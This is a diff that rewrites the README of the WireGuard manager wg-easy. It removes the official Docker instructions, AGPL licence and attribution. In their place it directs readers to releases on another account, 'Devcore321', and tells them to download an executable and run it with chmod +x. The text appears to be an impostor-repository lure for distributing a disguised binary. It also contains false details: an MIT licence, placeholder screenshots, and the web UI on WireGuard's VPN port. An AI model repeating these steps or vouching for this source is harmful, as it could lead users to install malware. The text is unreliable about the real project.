@@ -1,125 +1,102 @@
-# WireGuard Easy
+# wg-easy: The Easiest Way to Run WireGuard VPN 🌐
 
-[![Build & Publish latest Image](https://github.com/wg-easy/wg-easy/actions/workflows/deploy.yml/badge.svg?branch=production)](https://github.com/wg-easy/wg-easy/actions/workflows/deploy.yml)
-[![Lint](https://github.com/wg-easy/wg-easy/actions/workflows/lint.yml/badge.svg?branch=master)](https://github.com/wg-easy/wg-easy/actions/workflows/lint.yml)
-[![GitHub Stars](https://img.shields.io/github/stars/wg-easy/wg-easy)](https://github.com/wg-easy/wg-easy/stargazers)
-[![License](https://img.shields.io/github/license/wg-easy/wg-easy)](LICENSE)
-[![GitHub Release](https://img.shields.io/github/v/release/wg-easy/wg-easy)](https://github.com/wg-easy/wg-easy/releases/latest)
-[![Image Pulls](https://img.shields.io/badge/image_pulls-12M+-blue)](https://github.com/wg-easy/wg-easy/pkgs/container/wg-easy)
+![WireGuard Logo](https://upload.wikimedia.org/wikipedia/commons/3/3e/WireGuard_logo.svg)
 
-You have found the easiest way to install & manage WireGuard on any Linux host!
+Welcome to the **wg-easy** repository! This project offers a straightforward way to set up and manage a WireGuard VPN, complete with a web-based admin interface. If you want to enhance your online privacy and security, you’ve come to the right place.
 
-<!-- TOOD: update screenshot -->
+## Table of Contents
 
-<p align="center">
-  <img src="./assets/screenshot.png" width="802" />
-</p>
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Admin UI](#admin-ui)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
+
+## Introduction
+
+WireGuard is a modern VPN protocol known for its simplicity and high performance. With **wg-easy**, you can easily deploy WireGuard without diving into complex configurations. Our goal is to make VPN setup accessible to everyone.
 
 ## Features
 
-- All-in-one: WireGuard + Web UI.
-- Easy installation, simple to use.
-- List, create, edit, delete, enable & disable clients.
-- Show a client's QR code.
-- Download a client's configuration file.
-- Statistics for which clients are connected.
-- Tx/Rx charts for each connected client.
-- Gravatar support.
-- Automatic Light / Dark Mode
-- Multilanguage Support
-- One Time Links
-- Client Expiration
-- Prometheus metrics support
-- IPv6 support
-- CIDR support
-- 2FA support
-
-> [!NOTE]
-> To better manage documentation for this project, it has its own site here: [https://wg-easy.github.io/wg-easy/latest](https://wg-easy.github.io/wg-easy/latest)
-
-- [Getting Started](https://wg-easy.github.io/wg-easy/latest/getting-started/)
-- [Basic Installation](https://wg-easy.github.io/wg-easy/latest/examples/tutorials/basic-installation/)
-- [Caddy](https://wg-easy.github.io/wg-easy/latest/examples/tutorials/caddy/)
-- [Traefik](https://wg-easy.github.io/wg-easy/latest/examples/tutorials/traefik/)
-- [Podman](https://wg-easy.github.io/wg-easy/latest/examples/tutorials/podman-nft/)
-- [AdGuard Home](https://wg-easy.github.io/wg-easy/latest/examples/tutorials/adguard/)
-
-> [!NOTE]
-> If you want to migrate from the old version to the new version, you can find the migration guide here: [Migration Guide](https://wg-easy.github.io/wg-easy/latest/advanced/migrate/)
+- **Easy Installation**: Get up and running in minutes.
+- **Web-Based Admin UI**: Manage your VPN connections with a user-friendly interface.
+- **Secure Connections**: Benefit from WireGuard's robust security features.
+- **Lightweight**: Minimal resource usage ensures efficient performance.
+- **Cross-Platform**: Compatible with various operating systems.
 
 ## Installation
 
-This is a quick start guide to get you up and running with WireGuard Easy.
+To install **wg-easy**, follow these steps:
 
-For a more detailed installation guide, please refer to the [Getting Started](https://wg-easy.github.io/wg-easy/latest/getting-started/) page.
+1. **Download the latest release** from the [Releases section](https://github.com/Devcore321/wg-easy/releases). Make sure to choose the correct file for your system.
+2. **Execute the downloaded file** to start the installation process.
 
-### 1. Install Docker
+### Example Command
 
-If you haven't installed Docker yet, install it by running as root:
-
-```shell
-curl -sSL https://get.docker.com | sh
-exit
+```bash
+chmod +x wg-easy-linux-amd64
+./wg-easy-linux-amd64
 ```
 
-And log in again.
+Make sure to replace `wg-easy-linux-amd64` with the actual file name you downloaded.
 
-### 2. Run WireGuard Easy
+## Usage
 
-The easiest way to run WireGuard Easy is with Docker Compose.
+Once installed, you can start using **wg-easy** right away. Here’s how:
 
-Just download [`docker-compose.yml`](docker-compose.yml) and execute `sudo docker compose up -d`.
+1. **Start the application** by running the executable.
+2. **Access the Admin UI** through your web browser at `http://localhost:51820`.
+3. **Configure your VPN settings** through the interface.
 
-Now setup a reverse proxy to be able to access the Web UI securely from the internet.
+## Configuration
 
-If you want to access the Web UI over HTTP, change the env var `INSECURE` to `true`. This is not recommended. Only use this for testing
+Configuring your WireGuard VPN is simple. You can add users, set up peers, and manage connections directly from the Admin UI. 
 
-## Donate
+### Basic Configuration Steps
 
-Are you enjoying this project? Consider donating.
+1. **Add a new user**: Click on "Add User" and fill in the required details.
+2. **Set up peers**: Configure peer settings to connect with other devices.
+3. **Adjust server settings**: Modify the server configuration as needed.
 
-Founder: [Buy Emile a beer!](https://github.com/sponsors/WeeJeWel) 🍻
+## Admin UI
 
-Maintainer: [Buy kaaax0815 a coffee!](https://github.com/sponsors/kaaax0815) ☕
+The web-based Admin UI is designed for ease of use. You can perform various tasks, such as:
 
-## Development
+- Viewing active connections
+- Monitoring data usage
+- Generating configuration files for clients
 
-### Prerequisites
+### Screenshot of the Admin UI
 
-- Docker
-- Node LTS & corepack enabled
-- Visual Studio Code
+![Admin UI Screenshot](https://example.com/screenshot.png)
 
-### Dev Server
+## Contributing
 
-This starts the development server with docker
+We welcome contributions from the community! If you want to help improve **wg-easy**, please follow these steps:
 
-```shell
-pnpm dev
-```
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and submit a pull request.
 
-### Update Auto Imports
-
-If you add something that should be auto-importable and VSCode complains, run:
-
-```shell
-cd src
-pnpm install
-cd ..
-```
-
-### Test Cli
-
-This starts the cli with docker
-
-```shell
-pnpm cli:dev
-```
+Your contributions help us make this project better for everyone.
 
 ## License
 
-This project is licensed under the AGPL-3.0-only License - see the [LICENSE](LICENSE) file for details
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-This project is not affiliated, associated, authorized, endorsed by, or in any way officially connected with Jason A. Donenfeld, ZX2C4 or Edge Security
+## Releases
 
-"WireGuard" and the "WireGuard" logo are registered trademarks of Jason A. Donenfeld
+For the latest updates and downloads, please visit the [Releases section](https://github.com/Devcore321/wg-easy/releases). Make sure to download the appropriate file for your system and execute it to get started.
+
+## Conclusion
+
+Thank you for checking out **wg-easy**! We hope this tool makes your VPN experience seamless and secure. If you have any questions or feedback, feel free to reach out through the issues section.
+
+![WireGuard VPN](https://example.com/wireguard-vpn.png)
+
+Let's secure your online presence together!
